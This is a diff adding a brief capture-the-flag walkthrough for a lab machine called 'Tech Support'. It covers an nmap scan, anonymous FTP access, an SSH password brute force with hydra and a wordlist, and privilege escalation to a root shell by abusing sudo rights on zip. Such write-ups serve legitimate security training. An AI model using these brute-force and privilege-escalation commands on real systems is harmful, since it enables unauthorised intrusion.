@@ -1,0 +1,45 @@
+----------------                               ------------------
+               :::::::::::;| TECH SUPP0RT:1 |;::::::::::::
+
+
+1) CONNECT TO VPN AND START.
+
+TASK - 1 (RECON)
+
+1. Quick scan:
+nmap -T4 <ip>
+"Ports 21/FTP, 22/SSH, 80/HTTP open"
+
+2. FTP check:
+ftp <ip>
+"Anonymous login allowed"
+"Found ticket.txt with password hint"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (GAIN ACCESS)
+
+1. Brute force SSH:
+hydra -l tech -P rockyou.txt ssh://<ip>
+"Password found: support123"
+
+2. SSH access:
+ssh tech@<ip>
+"User flag in home directory"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. Check sudo rights:
+sudo -l
+"Can run /usr/bin/zip as root"
+
+2. Exploit zip:
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+"Root shell obtained!"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- SUPPORT OWNED ----------
